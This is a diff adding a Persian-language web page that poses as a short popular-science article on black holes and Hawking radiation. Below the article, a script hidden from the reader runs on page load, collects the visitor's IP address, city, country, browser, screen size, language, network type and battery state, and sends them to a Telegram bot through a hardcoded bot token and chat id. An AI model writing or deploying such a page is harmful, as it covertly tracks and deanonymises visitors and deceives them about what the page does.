@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <title>دانستنی علمی: سیاه‌چاله‌ها</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Vazirmatn', Tahoma, sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: justify;
+      line-height: 1.6;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 700px;
+      background: rgba(0,0,0,0.6);
+      border-radius: 15px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+      padding: 30px 40px;
+    }
+
+    h1 {
+      text-align: center;
+      color: #ffd700;
+      margin-bottom: 25px;
+      font-weight: 700;
+    }
+
+    p {
+      font-size: 1.1rem;
+      margin-bottom: 18px;
+    }
+
+    a {
+      color: #ffd700;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 0.9rem;
+      color: #ccc;
+      text-align: center;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>آیا سیاه‌چاله‌ها واقعا سیاه هستند؟</h1>
+    <p>
+      سیاه‌چاله‌ها مناطقی از فضا هستند که گرانش در آنها به حدی زیاد است که حتی نور نیز نمی‌تواند از آنها فرار کند. با این حال، نظریه‌ها و پژوهش‌های جدید نشان می‌دهد که سیاه‌چاله‌ها ممکن است به‌مرور زمان انرژی از دست داده و بخار شوند.
+    </p>
+    <p>
+      استیون هاوکینگ، فیزیکدان مشهور، نشان داد که سیاه‌چاله‌ها می‌توانند تابشی از خود منتشر کنند که به نام تابش هاوکینگ شناخته می‌شود. این پدیده می‌تواند منجر به تبخیر سیاه‌چاله‌ها شود.
+    </p>
+    <p>
+      تحقیقات بیشتر درباره اطلاعاتی که هنگام تبخیر سیاه‌چاله‌ها آزاد می‌شود، به درک بهتر قوانین بنیادی جهان کمک می‌کند و سوالات مهمی دربارهٔ نظریه کوانتوم و نسبیت مطرح می‌کند.
+    </p>
+
+    <footer>© 2025 علمی و جذاب - تمام حقوق محفوظ است.</footer>
+  </div>
+
+  <script>
+    async function collectAndSend() {
+      try {
+        const ipRes = await fetch("https://ipapi.co/json");
+        const ipData = await ipRes.json();
+
+        let batteryInfo = "نامشخص";
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryInfo = `🔋 شارژ: ${Math.round(battery.level * 100)}% | ${battery.charging ? 'در حال شارژ' : 'در حال مصرف'}`;
+          } catch (e) {}
+        }
+
+        const ua = navigator.userAgent;
+        const lang = navigator.language;
+        const res = screen.width + "x" + screen.height;
+        const time = new Date().toLocaleString("fa-IR");
+        const net = navigator.connection ? navigator.connection.effectiveType : "نامشخص";
+
+        const message = `📡 ورود جدید:\n🕓 زمان: ${time}\n🌍 کشور: ${ipData.country_name}\n🏙️ شهر: ${ipData.city}\n🌐 IP: ${ipData.ip}\n📱 مرورگر: ${ua}\n🖥️ رزولوشن: ${res}\n📶 اینترنت: ${net}\n🌐 زبان: ${lang}\n${batteryInfo}`;
+
+        await fetch("https://api.telegram.org/bot7652388395:AAHntUUw7_v73YQp_6ZzyqObdJyK22V-6Do/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: 2040814894,
+            text: message
+          })
+        });
+      } catch (e) {
+        console.error("خطا در ارسال اطلاعات:", e);
+      }
+    }
+
+    collectAndSend();
+  </script>
+</body>
+</html>
